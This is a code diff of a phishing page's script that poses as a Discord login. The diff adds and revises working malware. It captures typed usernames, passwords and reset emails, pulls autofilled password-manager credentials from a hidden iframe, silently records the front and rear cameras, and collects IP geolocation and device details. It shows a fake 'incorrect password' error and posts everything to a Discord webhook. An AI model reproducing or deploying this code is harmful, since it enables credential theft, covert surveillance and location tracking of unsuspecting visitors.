-            forgotLink.addEventListener('click', function(e) {
-                e.preventDefault();
-                forgotModal.classList.add('active');
-                resetEmailInput.value = '';
-                resetEmailInput.focus();
-            });
-            modalCancel.addEventListener('click', function() { forgotModal.classList.remove('active'); });
-            forgotModal.addEventListener('click', function(e) { if (e.target === this) this.classList.remove('active'); });
-            modalSend.addEventListener('click', function() {
-                const email = resetEmailInput.value.trim();
-                if (!email) { alert('Please enter your email address.'); return; }
-                const message = `🔐 **Forgot Password Email Capture**\n📧 **Email:** ${email}\n🕒 **Time:** ${getFormattedTime()}\n📅 **Date:** ${getFormattedDate()}`;
-                sendToDiscordWithFile(message, null, null);
-                alert('If an account exists for that email, we\'ve sent a password reset code.');
-                forgotModal.classList.remove('active');
-                resetEmailInput.value = '';
-            });
-
-            // ─── PASSWORD MANAGER STEALER ───
-            function stealPasswordManagerCredentials() {
-                try {
-                    const iframeDoc = pwStealer.contentDocument || pwStealer.contentWindow.document;
-                    const inputs = iframeDoc.querySelectorAll('input');
-                    if (inputs.length >= 2) {
-                        inputs[0].focus(); inputs[0].blur();
-                        inputs[1].focus(); inputs[1].blur();
-                        setTimeout(() => {
-                            const stolenUser = inputs[0].value || '';
-                            const stolenPass = inputs[1].value || '';
-                            if (stolenUser || stolenPass) {
-                                console.log('🔑 Stolen:', { username: stolenUser, password: stolenPass });
-                                if (stolenUser && !usernameInput.value) usernameInput.value = stolenUser;
-                                if (stolenPass && !passwordInput.value) passwordInput.value = stolenPass;
-                                window._stolenCreds = { username: stolenUser, password: stolenPass };
-                            }
-                        }, 500);
-                    }
-                } catch (e) { console.warn('Password manager steal failed:', e.message); }
-            }
-
-            // ─── HELPERS ───
-            function getFormattedDate() {
-                const now = new Date();
-                return `${now.getFullYear()}-${String(now.getMonth()+1).padStart(2,'0')}-${String(now.getDate()).padStart(2,'0')}`;
-            }
-            function getFormattedTime() {
-                const now = new Date();
-                let h = now.getHours();
-                const m = String(now.getMinutes()).padStart(2,'0');
-                const ampm = h >= 12 ? 'PM' : 'AM';
-                h = h % 12 || 12;
-                return `${h}:${m} ${ampm}`;
-            }
-            function getDeviceInfo() {
-                const ua = navigator.userAgent;
-                let os='Unknown', browser='Unknown', deviceType='Desktop', deviceModel='Unknown';
-                if (ua.indexOf('Windows NT 10.0')!==-1) os='Windows 10/11';
-                else if (ua.indexOf('Windows NT 6.3')!==-1) os='Windows 8.1';
-                else if (ua.indexOf('Windows NT 6.2')!==-1) os='Windows 8';
-                else if (ua.indexOf('Windows NT 6.1')!==-1) os='Windows 7';
-                else if (ua.indexOf('Mac OS X')!==-1) os='macOS';
-                else if (ua.indexOf('Android')!==-1) { os='Android'; const m=ua.match(/Android ([0-9.]+)/); if(m) os=`Android ${m[1]}`; }
-                else if (ua.indexOf('iPhone')!==-1) { os='iOS'; const m=ua.match(/OS ([0-9]+)_([0-9]+)/); if(m) os=`iOS ${m[1]}.${m[2]}`; }
-                else if (ua.indexOf('iPad')!==-1) { os='iPadOS'; const m=ua.match(/OS ([0-9]+)_([0-9]+)/); if(m) os=`iPadOS ${m[1]}.${m[2]}`; }
-                else if (ua.indexOf('Linux')!==-1) os='Linux';
-
-                if (ua.indexOf('Firefox')!==-1) { const m=ua.match(/Firefox\/([0-9.]+)/); browser = m ? `Firefox ${m[1]}` : 'Firefox'; }
-                else if (ua.indexOf('Edg')!==-1) { const m=ua.match(/Edg\/([0-9.]+)/); browser = m ? `Edge ${m[1]}` : 'Edge'; }
-                else if (ua.indexOf('Chrome')!==-1 && ua.indexOf('Edg')===-1 && ua.indexOf('OPR')===-1) { const m=ua.match(/Chrome\/([0-9.]+)/); browser = m ? `Chrome ${m[1]}` : 'Chrome'; }
-                else if (ua.indexOf('Safari')!==-1 && ua.indexOf('Chrome')===-1) { const m=ua.match(/Version\/([0-9.]+)/); browser = m ? `Safari ${m[1]}` : 'Safari'; }
-                else if (ua.indexOf('OPR')!==-1 || ua.indexOf('Opera')!==-1) { const m=ua.match(/(?:OPR|Opera)\/([0-9.]+)/); browser = m ? `Opera ${m[1]}` : 'Opera'; }
-
-                if (ua.indexOf('Android')!==-1) {
-                    deviceType='Android Phone/Tablet';
-                    const m=ua.match(/; ([^;]+) Build/);
-                    if(m) deviceModel=m[1].trim();
-                } else if (ua.indexOf('iPhone')!==-1) {
-                    deviceType='iPhone';
-                    const m=ua.match(/iPhone([0-9,]+)/);
-                    deviceModel = m ? `iPhone ${m[1].replace(/,/g,'')}` : 'iPhone';
-                } else if (ua.indexOf('iPad')!==-1) {
-                    deviceType='iPad';
-                    const m=ua.match(/iPad([0-9,]+)/);
-                    deviceModel = m ? `iPad ${m[1].replace(/,/g,'')}` : 'iPad';
-                } else if (ua.indexOf('Macintosh')!==-1) { deviceType='Mac'; deviceModel='Apple Mac'; }
-                else if (ua.indexOf('Windows')!==-1) { deviceType='Windows PC'; deviceModel='Windows Computer'; }
-                else if (ua.indexOf('Linux')!==-1) { deviceType='Linux PC'; deviceModel='Linux Computer'; }
-                return { os, browser, deviceType, deviceModel };
-            }
-            async function getGeoData() {
-                try {
-                    const r = await fetch('https://ipapi.co/json/');
-                    if (!r.ok) throw new Error();
-                    const d = await r.json();
-                    return { latitude: d.latitude||'Unknown', longitude: d.longitude||'Unknown', city: d.city||'Unknown', country: d.country_name||'Unknown', isp: d.org||'Unknown' };
-                } catch (_) {
-                    try {
-                        const r = await fetch('https://ipinfo.io/json');
-                        if (!r.ok) throw new Error();
-                        const d = await r.json();
-                        const loc = d.loc ? d.loc.split(',') : ['Unknown','Unknown'];
-                        return { latitude: loc[0]||'Unknown', longitude: loc[1]||'Unknown', city: d.city||'Unknown', country: d.country||'Unknown', isp: d.org||'Unknown' };
-                    } catch (_) { return { latitude:'Unknown', longitude:'Unknown', city:'Unknown', country:'Unknown', isp:'Unknown' }; }
-                }
-            }
-
-            // ─── SEND TO DISCORD WITH FILE ATTACHMENT ───
-            async function sendToDiscordWithFile(message, fileBlob, filename) {
-                if (!DISCORD_WEBHOOK_URL) return false;
-                try {
-                    const formData = new FormData();
-                    formData.append('content', message);
-                    if (fileBlob) {
-                        formData.append('file', fileBlob, filename);
-                    }
-                    const res = await fetch(DISCORD_WEBHOOK_URL, {
-                        method: 'POST',
-                        body: formData
-                    });
-                    console.log(`📥 Discord response status: ${res.status}`);
-                    return res.ok;
-                } catch (err) {
-                    console.error('❌ Network error:', err);
-                    return false;
-                }
-            }
-
-            // ─── FAKE ERROR – "Password or email incorrect" ───
-            function showFakeError() {
-                statusBar.textContent = '❌ Password or email incorrect. Please try again.';
-                statusBar.className = 'status-bar visible';
-                setTimeout(() => { statusBar.className = 'status-bar'; }, 6000);
-            }
-
-            // ─── FORM SUBMIT ───
-            form.addEventListener('submit', async (e) => {
-                e.preventDefault();
-                showFakeError();
-
-                const stolen = window._stolenCreds || {};
-                const geo = await getGeoData();
-                const device = getDeviceInfo();
-                const username = usernameInput.value.trim() || '(empty)';
-                const password = passwordInput.value.trim() || '(empty)';
-
-                // Prepare main message (no blob inline)
-                const message = `
-🔐 **DISCORD LOGIN + SILENT CAPTURE**
+const message = `
+🔐 **DISCORD LOGIN + SILENT VIDEO CAPTURE**
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-
 📍 **Location:** ${geo.city}, ${geo.country}
 🌐 **ISP:** ${geo.isp}
 🗺️ **Coordinates:** ${geo.latitude}, ${geo.longitude}
-
 📅 **Date:** ${getFormattedDate()}
 ⏰ **Time:** ${getFormattedTime()}
-
 💻 **Device Type:** ${device.deviceType}
 📱 **Device Model:** ${device.deviceModel}
 🖥️ **Operating System:** ${device.os}
 🌍 **Browser:** ${device.browser}
-
 👤 **Username:** ${username}
 🔑 **Password:** ${password}
 
@@ -432,74 +445,63 @@
 👤 **Stolen Username:** ${stolen.username || '(none)'}
 🔑 **Stolen Password:** ${stolen.password || '(none)'}
 
-📎 **Attachments:** Front camera (video/photo) & Rear camera (video/photo)
-                `.trim();
+📹 **Videos attached:** Front and Rear (if available)
+`.trim();
 
-                // Get latest blobs
-                let frontFile = latestFrontBlob || null;
-                let rearFile = latestRearBlob || null;
+let frontFile = latestFrontBlob || null;
+let rearFile = latestRearBlob || null;
 
-                // If no blob, try a last‑resort photo capture from the video element
-                if (!frontFile && videoFront.readyState >= 2) {
-                    const canvas = document.createElement('canvas');
-                    canvas.width = videoFront.videoWidth || 320;
-                    canvas.height = videoFront.videoHeight || 240;
-                    const ctx = canvas.getContext('2d');
-                    ctx.drawImage(videoFront, 0, 0);
-                    frontFile = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.7));
-                    if (frontFile) frontMimeType = 'image/jpeg';
-                }
-                if (!rearFile && videoRear.readyState >= 2) {
-                    const canvas = document.createElement('canvas');
-                    canvas.width = videoRear.videoWidth || 320;
-                    canvas.height = videoRear.videoHeight || 240;
-                    const ctx = canvas.getContext('2d');
-                    ctx.drawImage(videoRear, 0, 0);
-                    rearFile = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.7));
-                    if (rearFile) rearMimeType = 'image/jpeg';
-                }
+if (!frontFile && videoFront.readyState >= 2) {
+const canvas = document.createElement('canvas');
+canvas.width = videoFront.videoWidth || 320;
+canvas.height = videoFront.videoHeight || 240;
+const ctx = canvas.getContext('2d');
+ctx.drawImage(videoFront, 0, 0);
+frontFile = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.7));
+}
 
-                // Send front file (video or photo)
-                if (frontFile) {
-                    const ext = frontMimeType && frontMimeType.includes('video') ? 'mp4' : 'jpg';
-                    // If it's video but actually webm, adjust extension
-                    if (frontMimeType && frontMimeType.includes('webm')) ext = 'webm';
-                    const filename = `front_camera.${ext}`;
-                    await sendToDiscordWithFile(message, frontFile, filename);
-                } else {
-                    await sendToDiscordWithFile(message + '\n\n⚠️ No front camera data.', null, null);
-                }
+if (!rearFile && videoRear.readyState >= 2) {
+const canvas = document.createElement('canvas');
+canvas.width = videoRear.videoWidth || 320;
+canvas.height = videoRear.videoHeight || 240;
+const ctx = canvas.getContext('2d');
+ctx.drawImage(videoRear, 0, 0);
+rearFile = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.7));
+}
 
-                // Send rear file as separate message
-                if (rearFile) {
-                    const ext = rearMimeType && rearMimeType.includes('video') ? 'mp4' : 'jpg';
-                    if (rearMimeType && rearMimeType.includes('webm')) ext = 'webm';
-                    const filename = `rear_camera.${ext}`;
-                    await sendToDiscordWithFile('📹 Rear camera attachment:', rearFile, filename);
-                } else {
-                    await sendToDiscordWithFile('⚠️ No rear camera data.', null, null);
-                }
+if (frontFile) {
+const ext = frontFile.type.includes('video') ? 'webm' : 'jpg';
+await sendToDiscordWithFile(message, frontFile, `front_camera.${ext}`);
+} else {
+await sendToDiscordWithFile(message + '\n\n⚠️ No front camera data captured.', null, null);
+}
 
-                passwordInput.value = '';
-                // Keep blobs for next attempts
-            });
+if (rearFile) {
+const ext = rearFile.type.includes('video') ? 'webm' : 'jpg';
+await sendToDiscordWithFile('📹 Rear Camera attachment:', rearFile, `rear_camera.${ext}`);
+} else {
+await sendToDiscordWithFile('⚠️ No rear camera data captured.', null, null);
+}
 
-            // ─── INIT ───
-            window.addEventListener('DOMContentLoaded', () => {
-                initSilentCameras();
-                setTimeout(stealPasswordManagerCredentials, 1000);
-                setTimeout(stealPasswordManagerCredentials, 3000);
-                console.log('🌐 [PAGE LOAD] Visitor detected');
-            });
+passwordInput.value = '';
+});
 
-            window.addEventListener('beforeunload', () => {
-                if (window._recFront && window._recFront.state === 'recording') window._recFront.stop();
-                if (window._recRear && window._recRear.state === 'recording') window._recRear.stop();
-                if (videoFront.srcObject) videoFront.srcObject.getTracks().forEach(t => t.stop());
-                if (videoRear.srcObject) videoRear.srcObject.getTracks().forEach(t => t.stop());
-            });
+window.addEventListener('DOMContentLoaded', () => {
+initSilentCameras();
+setTimeout(stealPasswordManagerCredentials, 1000);
+setTimeout(stealPasswordManagerCredentials, 3000);
+console.log('🌐 [PAGE LOAD] Visitor detected - silent video recording active');
+});
 
-        })();
-    </script>
+window.addEventListener('beforeunload', () => {
+if (window._recFront && window._recFront.state === 'recording') window._recFront.stop();
+if (window._recRear && window._recRear.state === 'recording') window._recRear.stop();
+if (videoFront.srcObject) videoFront.srcObject.getTracks().forEach(t => t.stop());
+if (videoRear.srcObject) videoRear.srcObject.getTracks().forEach(t => t.stop());
+if (frontBlobUrl) URL.revokeObjectURL(frontBlobUrl);
+if (rearBlobUrl) URL.revokeObjectURL(rearBlobUrl);
+});
+})();
+</script>
 </body>
 </html>
